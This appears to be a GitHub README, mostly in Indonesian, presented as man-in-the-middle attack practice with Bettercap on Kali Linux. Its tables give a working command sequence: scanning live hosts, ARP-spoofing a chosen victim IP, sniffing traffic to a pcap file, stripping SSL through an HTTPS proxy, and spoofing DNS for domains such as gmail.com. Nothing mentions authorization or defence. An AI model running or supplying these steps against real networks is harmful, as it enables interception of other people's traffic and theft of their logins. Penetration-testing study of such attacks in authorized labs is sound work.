# bettercap.MITM-attack
Man In The Middle attack practice
lebih tepatnya kita meracuni ARP atau Address Resolution Protocol pada jaringan korban. dimana informasi yang berasal dari korban akan diredirect ke komputer Attacker terlebih dahulu sebelum menuju URL tujuan. disini kita akan menggunakan tools Bettercap.

saya menggunakan OS Kali linux. tools ini opsional nya sudah terinstall default. jika menggunakan selain Kali linux install dengan perintah. `sudo apt-get install bettercap`

### COMMAND TO RUN
RUN bettercap tools `sudo bettercap` <br>
#### table command http protocol (no SSL)
| command | information |
|---------|-------------|
| help | to show bettercap option |
| help (option) | to shown specific option information |
| net.probe on | start the net.probe to scan all live host in network |
| help arp.spoof | show information about arp.spoof |
| set arp.spoof.internal true | enable arp.spoof module |
| set arp.spoof.targets (target ip) | spoof victim arp |
| arp.spoof on | enable arp spoof |
| set net.sniff.output (directory to save capt file) | for enable /home/user/Document/pentest.pcap |
| net.sniff on | enable net sniff |

#### table command https protocol (with SSL)
| command | information |
|---------|-------------|
| help https.proxy | shown specific information about https.proxy |
| set https.proxy.sslstrip true | enable https.proxy mode (true) |
| set dns.spoof.address (ip address) | set dns spoofing with IP Address |
| set dns.spoof.domains (domain) | set dns spoofing domain, ex. gmail.com,www.gmail.com,https://gmail.com |
| dns.spoof on | enable dns.spoof |
<br>
<br>
![MITM](https://user-images.githubusercontent.com/92193431/173983407-df81ef0a-a41a-46c2-abcb-97bb0db59875.jpeg)
